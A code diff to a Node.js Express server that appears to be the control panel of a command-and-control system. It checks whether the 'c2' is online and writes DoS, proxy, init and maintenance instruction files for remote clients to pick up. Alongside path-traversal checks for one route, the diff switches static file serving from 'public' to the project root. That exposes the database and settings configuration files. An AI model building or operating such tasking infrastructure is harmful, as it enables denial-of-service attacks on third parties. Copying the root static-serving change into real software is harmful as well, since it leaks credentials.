@@ -9,7 +9,7 @@ const app = express();
 const PORT = 3000;
 
 app.use(express.json());
-app.use(express.static('public'));
+app.use(express.static('.'));
 
 // Load MariaDB config from db_controller.conf
 function loadMariaConfig() {
@@ -92,18 +92,125 @@ app.get('/api/status/c2', async (req, res) => {
   res.json({ c2: isC2Online });
 });
 
-app.post('/api/save-instruction-json', (req, res) => {
-  const { path: filePath, json } = req.body;
+// server.js (add or replace your existing /api/save-instruction-json route)
 
+app.post('/api/save-instruction-json', express.json(), (req, res) => {
+  const { filename, content } = req.body;
+
+  // 1) Strict filename check: no slashes, only alphanumeric, hyphens, underscores, and .json
+  const FN_RE = /^[A-Za-z0-9_-]+\.json$/;
+  if (!filename || !FN_RE.test(filename)) {
+    return res.status(400).json({ success: false, error: 'Invalid filename' });
+  }
+
+  // 2) Load interface_settings.conf
+  let instrPath;
   try {
-    const fullPath = path.join(__dirname, filePath);
-    fs.writeFileSync(fullPath, json, 'utf-8');
-    res.send("File saved to: " + filePath);
+    const raw = fs.readFileSync(path.join(__dirname, 'interface_settings.conf'), 'utf8');
+    const cfg = raw.split(/\r?\n/).reduce((o, line) => {
+      const [k,v] = line.split('=');
+      if (k && v) o[k.trim()] = v.trim();
+      return o;
+    }, {});
+    instrPath = cfg.instructions_path;
   } catch (err) {
-    console.error("Error saving JSON file:", err);
-    res.status(500).send("Failed to save JSON.");
+    console.error('Failed to read interface_settings.conf', err);
+    return res.status(500).json({ success: false, error: 'Server configuration error' });
+  }
+
+  if (!instrPath) {
+    return res.status(500).json({ success: false, error: 'instructions_path not set' });
+  }
+
+  // 3) Build absolute directory, ensure it exists
+  const baseDir = path.isAbsolute(instrPath)
+    ? instrPath
+    : path.join(__dirname, instrPath);
+  try {
+    fs.mkdirSync(baseDir, { recursive: true });
+  } catch (err) {
+    console.error('Failed to create instructions directory', err);
+    return res.status(500).json({ success: false, error: 'Cannot access instructions directory' });
+  }
+
+  // 4) Compose the full path, normalize, then verify no traversal
+  const fullPath = path.normalize(path.join(baseDir, filename));
+  if (!fullPath.startsWith(path.normalize(baseDir + path.sep))) {
+    return res.status(400).json({ success: false, error: 'Path traversal detected' });
+  }
+
+  // 5) Write the file
+  try {
+    fs.writeFileSync(fullPath, content, 'utf8');
+    return res.json({ success: true, path: fullPath });
+  } catch (err) {
+    console.error('Error saving JSON file:', err);
+    return res.status(500).json({ success: false, error: 'Failed to save file' });
   }
 });
+
+app.post('/api/instructions', express.json(), (req, res) => {
+  const instructions = req.body.instructions ?? req.body;  
+  console.log('Received instructions:', instructions);
+
+  // 1) Load instructions_path from interface_settings.conf
+  let instrPath;
+  try {
+    const raw = fs.readFileSync(
+      path.join(__dirname, 'interface_settings.conf'),
+      'utf8'
+    );
+    const cfg = raw.split(/\r?\n/).reduce((o, line) => {
+      const [k, v] = line.split('=');
+      if (k && v) o[k.trim()] = v.trim();
+      return o;
+    }, {});
+    instrPath = cfg.instructions_path;
+    if (!instrPath) throw new Error('instructions_path not set in config');
+  } catch (err) {
+    console.error('Could not read interface_settings.conf:', err);
+    return res.status(500).json({ success: false, error: err.message });
+  }
+
+  // 2) Resolve base directory and ensure it exists
+  const baseDir = path.isAbsolute(instrPath)
+    ? instrPath
+    : path.join(__dirname, instrPath);
+  try {
+    fs.mkdirSync(baseDir, { recursive: true });
+  } catch (err) {
+    console.error('Failed to create instructions directory:', err);
+    return res
+      .status(500)
+      .json({ success: false, error: 'Cannot access instructions directory' });
+  }
+
+  // 3) Map instruction keys → filenames
+  const fileMap = {
+    dos:         'dos_instructions.json',
+    init:        'init_instructions.json',
+    proxy:       'proxy_instructions.json',
+    maintenance: 'maintenance_instructions.json'
+  };
+
+  // 4) Write each block to its own file
+  try {
+    for (const [key, data] of Object.entries(instructions)) {
+      const filename = fileMap[key];
+      if (!filename) continue;  // skip unknown keys
+      const fullPath = path.join(baseDir, filename);
+      fs.writeFileSync(fullPath, JSON.stringify(data, null, 2), 'utf8');
+      console.log(`Saved ${key} instructions to ${fullPath}`);
+    }
+    return res.json({ success: true });
+  } catch (err) {
+    console.error('Error saving instruction files:', err);
+    return res
+      .status(500)
+      .json({ success: false, error: 'Failed to save instruction files' });
+  }
+});
+
 
 app.post('/save-settings', express.json(), (req, res) => {
   const settings = req.body;
